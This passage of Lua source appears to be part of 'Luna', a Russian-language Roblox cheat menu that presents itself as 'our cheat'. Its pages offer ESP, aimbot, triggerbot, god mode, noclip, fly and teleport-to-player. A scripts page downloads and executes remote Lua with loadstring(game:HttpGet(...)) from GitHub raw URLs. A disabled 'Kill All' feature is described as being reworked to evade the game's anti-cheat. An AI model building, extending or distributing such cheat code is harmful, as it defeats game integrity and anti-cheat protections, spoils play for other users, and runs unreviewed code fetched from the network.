    local knob = new("Frame", { Size = UDim2.fromOffset(15, 15), AnchorPoint = Vector2.new(0, 0.5),
        Position = UDim2.new(0, 3, 0.5, 0), BackgroundColor3 = C.dim, BorderSizePixel = 0, Parent = sw })
    corner(knob, 8)
    local hit = new("TextButton", { Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Text = "", AutoButtonColor = false, Parent = row })
    attachTooltip(hit, tip)
    hit.MouseButton1Click:Connect(function() Notify("Недоступно", tip, "warning", 4) end)
    return row
end

----------------------------------------------------------------------
-- PAGE FACTORY
----------------------------------------------------------------------
local PageList = {}
local function makePage(name)
    local page = new("ScrollingFrame", { Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, BorderSizePixel = 0,
        ScrollBarThickness = 3, ScrollBarImageColor3 = C.acc, Visible = false, CanvasSize = UDim2.fromScale(0, 0),
        AutomaticCanvasSize = Enum.AutomaticSize.Y, Parent = Pages })
    pad(page, 24, 4, 24, 24)
    new("UIListLayout", { Padding = UDim.new(0, 16), SortOrder = Enum.SortOrder.LayoutOrder, Parent = page })
    PageList[name] = page
    return page
end
local function columns(parent, count, order)
    local holder = new("Frame", { Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1, LayoutOrder = order or 0, Parent = parent })
    new("UIListLayout", { FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0, 16), SortOrder = Enum.SortOrder.LayoutOrder, Parent = holder })
    local cols = {}
    for i = 1, count do
        local col = new("Frame", { Size = UDim2.new(1 / count, -16 * (count - 1) / count, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
            BackgroundTransparency = 1, LayoutOrder = i, Parent = holder })
        new("UIListLayout", { Padding = UDim.new(0, 16), SortOrder = Enum.SortOrder.LayoutOrder, Parent = col })
        cols[i] = col
    end
    return cols
end

----------------------------------------------------------------------
-- CONFIG SAVE / LOAD
----------------------------------------------------------------------
local CFG_FOLDER = "LunaConfigs"
local hasFS   = typeof(writefile) == "function" and typeof(readfile) == "function"
local hasList = typeof(listfiles) == "function" and typeof(isfolder) == "function" and typeof(makefolder) == "function"
local function ensureFolder() if hasList and not isfolder(CFG_FOLDER) then pcall(makefolder, CFG_FOLDER) end end
local function cfgPath(name) return CFG_FOLDER .. "/" .. name .. ".json" end
local function sanitize(name) return (tostring(name):gsub("[^%w _%-]", "")):gsub("^%s*(.-)%s*$", "%1") end

local function saveConfig(name)
    name = sanitize(name); if name == "" then name = "default" end
    if not hasFS then Notify("Конфиг", "Executor не поддерживает файлы", "error"); return false end
    ensureFolder()
    local data = {}
    for k, v in pairs(State) do local t = type(v); if t == "number" or t == "boolean" or t == "string" then data[k] = v end end
    local ok = pcall(function() writefile(cfgPath(name), HttpService:JSONEncode(data)) end)
    Notify("Конфиг", ok and ("Сохранён: " .. name) or "Ошибка сохранения", ok and "success" or "error")
    return ok, name
end
local function loadConfig(name)
    name = sanitize(name)
    if not hasFS then Notify("Конфиг", "Нет доступа к файлам", "error"); return end
    if typeof(isfile) == "function" and not isfile(cfgPath(name)) then Notify("Конфиг", "Файл не найден: " .. name, "error"); return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(cfgPath(name))) end)
    if not ok or type(data) ~= "table" then Notify("Конфиг", "Ошибка чтения", "error"); return end
    local n = 0
    for k, v in pairs(data) do if Setters[k] then pcall(Setters[k], v); n += 1 end end
    Notify("Конфиг", "Загружен: " .. name .. " (" .. n .. ")", "success")
end
local function deleteConfig(name)
    name = sanitize(name)
    if typeof(delfile) == "function" then pcall(delfile, cfgPath(name)); Notify("Конфиг", "Удалён: " .. name, "warning")
    else Notify("Конфиг", "Удаление не поддерживается", "error") end
end
local function listConfigs()
    local out = {}
    if not hasList then return out end
    ensureFolder()
    local ok, files = pcall(listfiles, CFG_FOLDER)
    if ok and files then for _, f in ipairs(files) do
        local nm = f:match("([^/\\]+)%.json$"); if nm then table.insert(out, nm) end
    end end
    table.sort(out)
    return out
end
local function resetConfig()
    for k, setter in pairs(Setters) do pcall(function()
        if type(State[k]) == "boolean" then setter(false) end
    end) end
    Notify("Конфиг", "Настройки сброшены", "warning")
end

----------------------------------------------------------------------
-- PAGES
----------------------------------------------------------------------
-- ГЛАВНАЯ
do
    local p = makePage("Главная")
    local banner = new("Frame", { Size = UDim2.new(1, 0, 0, 92), BackgroundColor3 = C.card, BorderSizePixel = 0, LayoutOrder = 1, Parent = p })
    corner(banner, 10); gradient(banner, Color3.fromRGB(40, 28, 70), C.card, 25)
    new("TextLabel", { Size = UDim2.fromOffset(460, 24), Position = UDim2.fromOffset(20, 22), BackgroundTransparency = 1,
        Text = "Добро пожаловать, " .. LP.DisplayName .. "!", TextColor3 = C.text, TextSize = 19, Font = FONTB, TextXAlignment = Enum.TextXAlignment.Left, Parent = banner })
    new("TextLabel", { Size = UDim2.fromOffset(440, 18), Position = UDim2.fromOffset(20, 50), BackgroundTransparency = 1,
        Text = "Лучший помощник для твоей игры.", TextColor3 = C.sub, TextSize = 13, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = banner })
    local av = new("ImageLabel", { Size = UDim2.fromOffset(54, 54), Position = UDim2.new(1, -190, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5),
        BackgroundColor3 = C.elem, BorderSizePixel = 0, Parent = banner })
    corner(av, 27); stroke(av, C.acc, 1.5, 0.2)
    pcall(function() av.Image = Players:GetUserThumbnailAsync(LP.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100) end)
    new("TextLabel", { Size = UDim2.fromOffset(120, 18), Position = UDim2.new(1, -128, 0.5, -12), BackgroundTransparency = 1,
        Text = LP.DisplayName, TextColor3 = C.text, TextSize = 14, Font = FONTB, TextXAlignment = Enum.TextXAlignment.Left, Parent = banner })
    new("TextLabel", { Size = UDim2.fromOffset(120, 14), Position = UDim2.new(1, -128, 0.5, 8), BackgroundTransparency = 1,
        Text = "Tester", TextColor3 = C.acc, TextSize = 12, Font = FONTB, TextXAlignment = Enum.TextXAlignment.Left, Parent = banner })

    local r1 = columns(p, 2, 2)
    local statusCard = Widgets.Card(r1[1], "Статус")
    Widgets.Info(statusCard, "Состояние", "Включен", C.green)
    Widgets.Info(statusCard, "Версия", "1.0.0")
    Widgets.Info(statusCard, "Сборка", "Tested", C.cyan)
    Widgets.Info(statusCard, "Пользователь", LP.DisplayName)
    local _, uptimeVal = Widgets.Info(statusCard, "Время работы", "00:00:00", C.acc)
    local started = os.time()
    task.spawn(function() while uptimeVal and uptimeVal.Parent do
        local t = os.time() - started
        uptimeVal.Text = string.format("%02d:%02d:%02d", t // 3600, (t % 3600) // 60, t % 60)
        task.wait(1)
    end end)

    local qa = Widgets.Card(r1[2], "Быстрые действия")
    Widgets.Button(qa, "Загрузить конфиг", false, function() loadConfig("default") end)
    Widgets.Button(qa, "Сохранить конфиг", false, function() saveConfig("default") end)
    Widgets.Button(qa, "Сбросить конфиг", false, resetConfig)
    Widgets.Button(qa, "Открыть папку с конфигами", false, function() Notify("Конфиг", "Папка: workspace/", "info") end)

    local r2 = columns(p, 2, 3)
    local news = Widgets.Card(r2[1], "Новости")
    new("TextLabel", { Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1, Text = os.date("%d.%m.%Y"), TextColor3 = C.dim,
        TextSize = 11, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = news })
    new("TextLabel", { Size = UDim2.new(1, 0, 0, 36), BackgroundTransparency = 1,
        Text = "Добро пожаловать в Luna! Спасибо за использование нашего чита.", TextColor3 = C.sub, TextSize = 13, Font = FONT,
        TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top, Parent = news })
    new("TextLabel", { Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1, Text = "Мы желаем тебе приятной игры!",
        TextColor3 = C.acc, TextSize = 12, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = news })

    local stats = Widgets.Card(r2[2], "Статистика")
    local grid = new("Frame", { Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1, Parent = stats })
    new("UIGridLayout", { CellSize = UDim2.new(0.5, -6, 0, 50), CellPadding = UDim2.fromOffset(12, 12), SortOrder = Enum.SortOrder.LayoutOrder, Parent = grid })
    local function statBox(label, value, col)
        local b = new("Frame", { BackgroundColor3 = C.elem, BorderSizePixel = 0, Parent = grid }); corner(b, 8)
        new("TextLabel", { Size = UDim2.new(1, -16, 0, 22), Position = UDim2.fromOffset(10, 6), BackgroundTransparency = 1, Text = value,
            TextColor3 = col or C.text, TextSize = 18, Font = FONTB, TextXAlignment = Enum.TextXAlignment.Left, Parent = b })
        new("TextLabel", { Size = UDim2.new(1, -16, 0, 14), Position = UDim2.fromOffset(10, 30), BackgroundTransparency = 1, Text = label,
            TextColor3 = C.dim, TextSize = 11, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = b })
    end
    statBox("Убийств", "0", C.green); statBox("Смертей", "0", C.red); statBox("К/Д", "0.00", C.acc); statBox("Игроков", tostring(#Players:GetPlayers()), C.cyan)
end

-- ВИЗУАЛЫ
do
    local p = makePage("Визуалы")
    local cols = columns(p, 2, 1)
    local left = Widgets.Card(cols[1], "Игроки")
    Widgets.Toggle(left, "Включить ESP", false, function(v) Notify("ESP", v and "Включён" or "Выключен", v and "success" or "info") end, "esp_master")
    Widgets.Toggle(left, "Боксы", true, nil, "esp_boxes")
    Widgets.Toggle(left, "Имя", true, nil, "esp_names")
    Widgets.Toggle(left, "Здоровье", true, nil, "esp_health")
    Widgets.Toggle(left, "Дистанция", false, nil, "esp_dist")
    Widgets.Toggle(left, "Линии (tracers)", false, nil, "esp_tracers")
    local right = Widgets.Card(cols[2], "Настройка")
    Widgets.Dropdown(right, "Тип бокса", { "2D", "Угловой" }, "2D")
    Widgets.Slider(right, "Толщина", 1, 5, 2, function(v) for _, o in pairs(espObjects) do o.bs.Thickness = v end end)
    Widgets.Slider(right, "Макс. дистанция", 100, 5000, 1000)
end

-- ХУД
do
    local p = makePage("Худ (HUD)")
    local cols = columns(p, 2, 1)
    local left = Widgets.Card(cols[1], "Основное")
    Widgets.Toggle(left, "Включить худ", false, function(v) WM.Visible = v end, "wm_on")
    Widgets.Toggle(left, "FPS", true, nil, "wm_fps")
    Widgets.Toggle(left, "Пинг", true, nil, "wm_ping")
    Widgets.Toggle(left, "Время", false, nil, "wm_time")
    Widgets.Toggle(left, "Список игроков", true, nil, "wm_players")
    local right = Widgets.Card(cols[2], "Настройка")
    Widgets.Dropdown(right, "Позиция", { "Верх слева", "Верх справа", "Низ слева", "Низ справа" }, "Верх слева",
        function(v) State.wm_pos = v end, "wm_pos")
end

-- ИГРОКИ
do
    local p = makePage("Игроки")
    local cols = columns(p, 2, 1)
    local left = Widgets.Card(cols[1], "Основное")
    Widgets.Toggle(left, "God Mode", false, setGod, "godmode")
    Widgets.Toggle(left, "No Clip", false, setNoclip, "noclip")
    Widgets.Toggle(left, "Полёт (Fly)", false, setFly, "fly")
    Widgets.Slider(left, "Скорость полёта", 20, 200, 60, function(v) State.flyspeed = v end, "flyspeed")
    Widgets.Slider(left, "WalkSpeed", 16, 200, 16, function(v) State.walkspeed = v; applyWalk() end, "walkspeed")
    Widgets.Slider(left, "JumpPower", 50, 300, 50, function(v) State.jumppower = v; applyJump() end, "jumppower")
    Widgets.Toggle(left, "Inf Jump", false, nil, "infjump")
    Widgets.Toggle(left, "Anti Void", false, nil, "antivoid")

    local right = Widgets.Card(cols[2], "Телепорты")
    local names = {}
    for _, pl in ipairs(Players:GetPlayers()) do if pl ~= LP then table.insert(names, pl.Name) end end
    if #names == 0 then names = { "нет игроков" } end
    local selected = names[1]
    Widgets.Dropdown(right, "Выбрать игрока", names, names[1], function(v) selected = v end)
    Widgets.Button(right, "Телепортироваться", true, function() teleportTo(Players:FindFirstChild(selected)) end)

    local ka = Widgets.Card(cols[2], "Kill All")
    Widgets.DisabledToggle(ka, "Включить Kill All", "В разработке — скоро будет доступно. Сейчас на тестах: дорабатываем обход анти-чита.")
    new("TextLabel", { Size = UDim2.new(1, 0, 0, 30), BackgroundTransparency = 1, TextWrapped = true,
        Text = "Функция временно отключена — дорабатывается, чтобы не ловить анти-чит. Скоро завезём.",
        TextColor3 = C.dim, TextSize = 12, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top, Parent = ka })
end

-- МИР
do
    local p = makePage("Мир")
    local cols = columns(p, 2, 1)
    local left = Widgets.Card(cols[1], "Основное")
    Widgets.Toggle(left, "Осветлить карту (Fullbright)", false, setFullbright, "fullbright")
    Widgets.Toggle(left, "Ночное зрение", false, setNightVision, "night")
    Widgets.Toggle(left, "Убрать туман", false, setNoFog, "nofog")
    Widgets.Toggle(left, "Убрать небо", false, setNoSky, "nosky")
    Widgets.Toggle(left, "Бесконечный день", false, setForeverDay, "foreverday")
    local right = Widgets.Card(cols[2], "Настройка")
    Widgets.Slider(right, "Яркость", 0, 5, math.floor(Lighting.Brightness), function(v) if not State.fullbright then Lighting.Brightness = v end end)
    Widgets.Slider(right, "Гравитация", 0, 400, math.floor(workspace.Gravity), function(v) workspace.Gravity = v end)
    Widgets.Slider(right, "Время суток", 0, 24, math.floor(Lighting.ClockTime), function(v) if not State.foreverday then Lighting.ClockTime = v end end)
end

-- ОРУЖИЕ
do
    local p = makePage("Оружие")
    local cols = columns(p, 2, 1)

    local left = Widgets.Card(cols[1], "Аимбот")
    Widgets.Toggle(left, "Включить аимбот", false, nil, "aimbot")
    Widgets.Keybind(left, "Клавиша прицела", Enum.UserInputType.MouseButton2, function(b) aimKeyBind = b end, "aim_key")
    Widgets.Dropdown(left, "Режим", { "Зажатие", "Переключение", "Всегда" }, "Зажатие", function(v) State.aim_mode = v end, "aim_mode")
    Widgets.Dropdown(left, "Точка прицела", { "Голова", "Грудь", "Корпус" }, "Голова", function(v) State.aim_part = v end, "aim_part")
    Widgets.Slider(left, "FOV", 20, 800, 140, nil, "aim_fov")
    Widgets.Slider(left, "Плавность", 0, 95, 30, nil, "aim_smooth")
    Widgets.Slider(left, "Предсказание", 0, 100, 0, nil, "aim_pred")
    Widgets.Slider(left, "Макс. дистанция", 50, 5000, 1000, nil, "aim_maxdist")

    local leftB = Widgets.Card(cols[1], "Аимбот — дополнительно")
    Widgets.Toggle(leftB, "Проверка команды", false, nil, "aim_team")
    Widgets.Toggle(leftB, "Только видимые (стены)", false, nil, "aim_wall")
    Widgets.Toggle(leftB, "Залипание на цели", false, nil, "aim_sticky")
    Widgets.Toggle(leftB, "Показывать FOV-круг", true, nil, "aim_fovcircle")
    Widgets.Dropdown(leftB, "Цвет FOV-круга", { "Фиолетовый", "Белый", "Красный", "Зелёный", "Голубой" }, "Фиолетовый",
        function(v) FovStroke.Color = FOV_COLORS[v] or C.acc end, "aim_fovcolor")

    local right = Widgets.Card(cols[2], "Триггербот")
    Widgets.Toggle(right, "Включить триггербот", false, nil, "trigger")
    Widgets.Dropdown(right, "Режим", { "Зажатие", "Всегда" }, "Зажатие", function(v) State.trig_mode = v end, "trig_mode")
    Widgets.Keybind(right, "Клавиша", Enum.KeyCode.E, function(b) trigKeyBind = b end, "trig_key")
    Widgets.Slider(right, "Задержка (мс)", 0, 500, 50, nil, "trigger_delay")
    Widgets.Slider(right, "Макс. дистанция", 50, 5000, 1000, nil, "trig_maxdist")
    Widgets.Toggle(right, "Хитбоксы по имени (crit/arm/...)", true, nil, "trig_hitbox")
    Widgets.Toggle(right, "Проверка команды", false, nil, "trig_team")

    local rightB = Widgets.Card(cols[2], "Отладка")
    Widgets.Toggle(rightB, "Окно отладки (F9)", false, function(v) DebugWin.Visible = v end, "debug")
    new("TextLabel", { Size = UDim2.new(1, 0, 0, 48), BackgroundTransparency = 1, TextWrapped = true,
        Text = "Аимбот наводит камеру на цель по выбранной клавише. Триггербот стреляет, когда прицел на враге (нужен executor с mouse1click).",
        TextColor3 = C.sub, TextSize = 12, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top, Parent = rightB })
end

-- СКРИПТЫ
do
    local p = makePage("Скрипты")
    local card = Widgets.Card(p, "Библиотека скриптов")
    local scripts = {
        { "Infinite Yield", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source" },
        { "Dark Dex (Explorer)", "https://raw.githubusercontent.com/Babyhamsta/RoarsHax/main/scripts/dex.lua" },
        { "Hydroxide", "https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/init.lua" },
    }
    for _, sc in ipairs(scripts) do
        local row = new("Frame", { Size = UDim2.new(1, 0, 0, 38), BackgroundColor3 = C.elem, BorderSizePixel = 0, Parent = card })
        corner(row, 7)
        new("TextLabel", { Size = UDim2.new(1, -100, 1, 0), Position = UDim2.fromOffset(12, 0), BackgroundTransparency = 1, Text = sc[1],
            TextColor3 = C.text, TextSize = 13, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = row })
        local run = Widgets.Button(row, "Запустить", true, function()
            Notify("Скрипты", "Загрузка " .. sc[1] .. "...", "info")
            task.spawn(function()
                local ok, err = pcall(function() loadstring(game:HttpGet(sc[2]))() end)
                Notify("Скрипты", ok and (sc[1] .. " запущен") or ("Ошибка: " .. tostring(err):sub(1, 40)), ok and "success" or "error")
            end)
        end)
        run.Size = UDim2.fromOffset(84, 26); run.Position = UDim2.new(1, -94, 0.5, 0); run.AnchorPoint = Vector2.new(0, 0.5)
    end
end

-- КОНФИГ
do
    local p = makePage("Конфиг")

    local saveCard = Widgets.Card(p, "Сохранить конфиг")
    local inputRow = new("Frame", { Size = UDim2.new(1, 0, 0, 34), BackgroundTransparency = 1, Parent = saveCard })
    local nameBox = new("TextBox", { Size = UDim2.new(1, -108, 1, 0), BackgroundColor3 = C.elem, BorderSizePixel = 0,
        Text = "", PlaceholderText = "Имя конфига...", PlaceholderColor3 = C.dim, TextColor3 = C.text, TextSize = 13,
        Font = FONT, ClearTextOnFocus = false, TextXAlignment = Enum.TextXAlignment.Left, Parent = inputRow })
    corner(nameBox, 7); stroke(nameBox, C.border, 1, 0.5); pad(nameBox, 10, 0, 10, 0)
    local refreshList
    local saveBtn = new("TextButton", { Size = UDim2.fromOffset(98, 34), Position = UDim2.new(1, -98, 0, 0),
        BackgroundColor3 = C.acc, Text = "Сохранить", TextColor3 = C.text, TextSize = 13, Font = FONTB,
        AutoButtonColor = false, BorderSizePixel = 0, Parent = inputRow })
    corner(saveBtn, 7)
    saveBtn.MouseEnter:Connect(function() tw(saveBtn, QUICK, { BackgroundColor3 = C.accDim }):Play() end)
    saveBtn.MouseLeave:Connect(function() tw(saveBtn, QUICK, { BackgroundColor3 = C.acc }):Play() end)
    saveBtn.MouseButton1Click:Connect(function()
        local ok = saveConfig(nameBox.Text ~= "" and nameBox.Text or ("config_" .. os.date("%H%M%S")))
        if ok then nameBox.Text = ""; if refreshList then refreshList() end end
    end)
    if not hasFS then
        new("TextLabel", { Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1,
            Text = "Executor не поддерживает запись файлов", TextColor3 = C.orange, TextSize = 12, Font = FONT,
            TextXAlignment = Enum.TextXAlignment.Left, Parent = saveCard })
    end

    local listCard = Widgets.Card(p, "Сохранённые конфиги")
    local hint = new("TextLabel", { Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1, Text = "",
        TextColor3 = C.dim, TextSize = 12, Font = FONT, TextXAlignment = Enum.TextXAlignment.Left, Parent = listCard })
    local holder = new("Frame", { Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1, Parent = listCard })
    new("UIListLayout", { Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.Name, Parent = holder })

    refreshList = function()
        for _, ch in ipairs(holder:GetChildren()) do if not ch:IsA("UIListLayout") then ch:Destroy() end end
        local names = listConfigs()
        hint.Text = (#names == 0) and "Нет сохранённых конфигов. Создай выше." or ("Найдено: " .. #names)
        for _, nm in ipairs(names) do
            local row = new("Frame", { Size = UDim2.new(1, 0, 0, 40), BackgroundColor3 = C.elem, BorderSizePixel = 0, Name = nm, Parent = holder })
            corner(row, 7)
            new("TextLabel", { Size = UDim2.new(1, -86, 1, 0), Position = UDim2.fromOffset(12, 0), BackgroundTransparency = 1, Text = nm,
                TextColor3 = C.text, TextSize = 14, Font = FONTB, TextXAlignment = Enum.TextXAlignment.Left, Parent = row })
            local x = 0
            for _, ic in ipairs({
                { "play", C.green, function() loadConfig(nm) end },
                { "trash", C.red, function() deleteConfig(nm); refreshList() end },
            }) do
                local b = new("TextButton", { Size = UDim2.fromOffset(28, 28), Position = UDim2.new(1, -36 - x, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5),
                    BackgroundColor3 = C.card, Text = "", AutoButtonColor = false, BorderSizePixel = 0, Parent = row })
                corner(b, 7)
                local ico = Icon(b, ic[1], ic[2], 16); ico.Position = UDim2.fromOffset(6, 6)
                b.MouseButton1Click:Connect(ic[3])
                x = x + 34
            end
        end
    end
    refreshList()
    Widgets.Button(listCard, "Обновить список", false, refreshList)
end

-- НАСТРОЙКИ
do
    local p = makePage("Настройки")
    local cols = columns(p, 2, 1)
    local gen = Widgets.Card(cols[1], "Общие")
    Widgets.Dropdown(gen, "Язык", { "Русский", "English" }, "Русский", function(v) Notify("Настройки", "Язык: " .. v, "info") end)
    Widgets.Dropdown(gen, "Тема", { "Luna Purple", "Midnight", "Crimson" }, "Luna Purple")
    Widgets.Toggle(gen, "Автозапуск", false, nil, "autorun")
    local sec = Widgets.Card(cols[2], "Безопасность")
    Widgets.Toggle(sec, "Анти-скриншот", false, nil, "antiss")
    Widgets.Toggle(sec, "Защита от отладки", false, nil, "antidebug")
    local other = Widgets.Card(cols[2], "Другое")
    Widgets.Button(other, "Сбросить настройки", false, resetConfig)
    local unloadBtn = Widgets.Button(other, "Выгрузить Luna (End)", false, function() if unloadLuna then unloadLuna() end end)
    unloadBtn.BackgroundColor3 = Color3.fromRGB(60, 24, 32); unloadBtn.TextColor3 = C.red
    new("TextLabel", { Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1, Text = "Luna v1.0.0", TextColor3 = C.dim,
        TextSize = 11, Font = FONT, TextXAlignment = Enum.TextXAlignment.Right, Parent = other })
end

----------------------------------------------------------------------
-- NAV BUTTONS
----------------------------------------------------------------------
local NAV = {
    { "Главная", "home" }, { "Визуалы", "eye" }, { "Худ (HUD)", "bars" }, { "Игроки", "users" },
    { "Мир", "globe" }, { "Оружие", "crosshair" }, { "Скрипты", "file" }, { "Конфиг", "save" }, { "Настройки", "gear" },
}
local navButtons = {}
local current = nil
local function selectPage(name)
    if current == name then return end
    for n, b in pairs(navButtons) do
        local sel = (n == name)
        tw(b.bg, QUICK, { BackgroundColor3 = sel and C.elem or C.side }):Play()
        tw(b.bar, QUICK, { BackgroundTransparency = sel and 0 or 1 }):Play()
        tw(b.label, QUICK, { TextColor3 = sel and C.text or C.sub }):Play()
        recolorIcon(b.icon, sel and C.acc or C.dim)
    end
    for n, pg in pairs(PageList) do pg.Visible = (n == name) end
    Title.Text = name; current = name
end
for i, item in ipairs(NAV) do
    local name, iconName = item[1], item[2]
    local bg = new("TextButton", { Size = UDim2.new(1, 0, 0, 38), BackgroundColor3 = C.side, Text = "", AutoButtonColor = false,
        BorderSizePixel = 0, LayoutOrder = i, Parent = NavHolder })
    corner(bg, 8)
    local bar = new("Frame", { Size = UDim2.fromOffset(3, 18), Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5),
        BackgroundColor3 = C.acc, BackgroundTransparency = 1, BorderSizePixel = 0, Parent = bg })
    corner(bar, 2)
    local ico = Icon(bg, iconName, C.dim, 20); ico.Position = UDim2.fromOffset(12, 9)
    local lbl = new("TextLabel", { Size = UDim2.new(1, -44, 1, 0), Position = UDim2.fromOffset(42, 0), BackgroundTransparency = 1,
        Text = name, TextColor3 = C.sub, TextSize = 13, Font = FONTB, TextXAlignment = Enum.TextXAlignment.Left, Parent = bg })
    navButtons[name] = { bg = bg, bar = bar, icon = ico, label = lbl }
    bg.MouseEnter:Connect(function() if current ~= name then tw(bg, QUICK, { BackgroundColor3 = C.elem }):Play() end end)
    bg.MouseLeave:Connect(function() if current ~= name then tw(bg, QUICK, { BackgroundColor3 = C.side }):Play() end end)
    bg.MouseButton1Click:Connect(function() selectPage(name) end)
end

----------------------------------------------------------------------
-- DRAG
----------------------------------------------------------------------
do
    local dragging, dragStart, startPos
    Header.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = i.Position; startPos = Win.Position
            i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then dragging = false end end)
        end
    end)
    UIS.InputChanged:Connect(function(i)
        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
            local d = i.Position - dragStart
            Win.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

----------------------------------------------------------------------
-- OPEN / CLOSE
----------------------------------------------------------------------
-- Free the mouse cursor while the menu is open (works in first person too).
local prevIconEnabled
local function setMouseFree(free)
    if free then
        prevIconEnabled = UIS.MouseIconEnabled
        UIS.MouseIconEnabled = true
        RunService:BindToRenderStep("LunaMouseFree", Enum.RenderPriority.Camera.Value + 1, function()
            UIS.MouseBehavior = Enum.MouseBehavior.Default
        end)
    else
        pcall(function() RunService:UnbindFromRenderStep("LunaMouseFree") end)
        if prevIconEnabled ~= nil then UIS.MouseIconEnabled = prevIconEnabled end
    end
end
local function openMenu()
    isOpen = true; Win.Visible = true; WinScale.Scale = 0.85; Win.BackgroundTransparency = 1
    setMouseFree(true)
    tw(Backdrop, TweenInfo.new(0.25), { BackgroundTransparency = 0.45 }):Play()
    tw(Win, TweenInfo.new(0.3), { BackgroundTransparency = 0 }):Play()
    Tween:Create(WinScale, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
end
local function closeMenu()
    isOpen = false
    setMouseFree(false)
    tw(Backdrop, TweenInfo.new(0.2), { BackgroundTransparency = 1 }):Play()
    tw(Win, TweenInfo.new(0.2), { BackgroundTransparency = 1 }):Play()
    local t = Tween:Create(WinScale, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Scale = 0.85 })
    t:Play(); t.Completed:Wait(); Win.Visible = false
end
CloseBtn.MouseButton1Click:Connect(closeMenu)

----------------------------------------------------------------------
-- FULL UNLOAD
----------------------------------------------------------------------
unloadLuna = function()
    if Luna_Unloaded then return end
    Luna_Unloaded = true
    Notify("LUNA", "Выгрузка...", "warning", 3)
    -- stop render binds
    pcall(function() RunService:UnbindFromRenderStep("LunaAim") end)
    pcall(function() RunService:UnbindFromRenderStep("LunaMouseFree") end)
    -- turn off all features
    for _, fn in ipairs({ setNoclip, setGod, setFly, setForeverDay, setFullbright, setNoFog, setNoSky, setNightVision }) do
        pcall(fn, false)
    end
    -- disable remaining state-driven features
    State.antivoid, State.infjump, State.aimbot, State.trigger = false, false, false, false
    State.esp_master, State.wm_on = false, false
    pcall(function() WM.Visible = false; FovCircle.Visible = false; DebugWin.Visible = false end)
    -- restore lighting & gravity
    pcall(function()
        Lighting.Brightness = lightSaved.Brightness; Lighting.FogEnd = lightSaved.FogEnd; Lighting.FogStart = lightSaved.FogStart
        Lighting.ClockTime = lightSaved.ClockTime; Lighting.Ambient = lightSaved.Ambient; Lighting.OutdoorAmbient = lightSaved.OutdoorAmbient
    end)
    pcall(function() workspace.Gravity = savedGravity end)
    -- restore character
    pcall(function()
        local h = getHum()
        if h then h.WalkSpeed = 16; h.UseJumpPower = true; h.JumpPower = 50
            if h.MaxHealth == math.huge then h.MaxHealth = 100; h.Health = 100 end end
    end)
    -- restore mouse
    pcall(function() UIS.MouseIconEnabled = true; UIS.MouseBehavior = Enum.MouseBehavior.Default end)
    -- destroy UI (after the notification has shown briefly)
    task.delay(1.2, function()
        pcall(function() GUI:Destroy() end)
        pcall(function() ESPGui:Destroy() end)
    end)
end

UIS.InputBegan:Connect(function(i, gp)
    if Luna_Unloaded then return end
    if i.KeyCode == Enum.KeyCode.End then unloadLuna(); return end
    if gp then return end
    if i.KeyCode == Enum.KeyCode.Insert or i.KeyCode == Enum.KeyCode.RightShift then
        if isOpen then closeMenu() else openMenu() end
    elseif i.KeyCode == Enum.KeyCode.F9 then
        local v = not DebugWin.Visible
        if Setters.debug then Setters.debug(v) else DebugWin.Visible = v end
    end
end)

----------------------------------------------------------------------
-- INIT
----------------------------------------------------------------------
selectPage("Главная")
openMenu()
Notify("LUNA", "Загружено! [Insert] меню, [End] выгрузка", "success", 5)
